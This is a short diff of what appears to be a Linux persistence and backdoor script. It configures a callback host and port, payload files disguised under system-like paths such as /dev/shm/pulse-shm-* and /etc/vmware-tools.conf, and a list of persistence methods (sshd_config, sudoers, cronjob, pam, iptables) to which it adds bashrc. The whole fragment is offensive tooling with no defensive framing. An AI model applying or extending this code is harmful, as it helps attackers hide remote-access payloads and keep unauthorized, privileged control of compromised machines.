@@ -9,7 +9,7 @@ host="192.168.204.128"
 port="8080"
 
 
-payload1="/dev/shm/pulse-shm-10175238 $host $port" 
+payload1="/dev/shm/pulse-shm-401862937 $host $port" 
 payload2="/dev/loop17 $host $port"
 payload3="/etc/vmware-tools.conf $host $port"
 
@@ -99,6 +99,7 @@ sshd_config
 sudoers
 cronjob
 pam
+bashrc  
 iptables
 
 # Start copyman 
